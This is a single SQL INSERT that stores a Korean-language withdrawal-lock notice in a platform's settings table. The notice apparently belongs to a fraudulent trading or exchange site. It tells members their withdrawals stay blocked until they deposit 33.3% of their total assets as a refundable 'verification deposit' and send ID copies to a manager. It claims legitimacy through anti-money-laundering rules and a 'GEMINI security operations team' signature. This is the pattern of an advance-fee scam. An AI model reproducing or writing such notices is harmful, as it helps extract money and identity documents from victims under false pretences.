INSERT INTO public.settings (key, value, updated_at) VALUES ('withdrawal_lock_notice', '1. 본인 확인 증거금 예치\n증거금: 총 자산의 33.3%\n용도: 계정 실소유주 입증 및 금융거래 사실 확인용\n반환: 확인 절차 완료 즉시 기존 자산과 합산하여 전액(100%) 환급\n\n2. 증빙 서류 제출\n필수 서류: 유효한 신분증 사본 (주민등록증, 운전면허증 등)\n제출처: 담당 관리자 및 보안 전담팀 1:1 접수\n\n3. 예치하셨던 예수금 출처\n자금 세탁을 방지한 예수금 출처.\n\n본 절차는 자금세탁방지(AML) 및 금융 보안 규정에 근거한 정식 프로세스입니다. 회원님의 신속한 협조는 계정 정상화 시간을 단축할 수 있습니다.\n\n항상 안전한 거래 환경을 위해 최선을 다하겠습니다.\nGEMINI 보안 운영팀 드림', '2026-06-22 06:49:40.544');
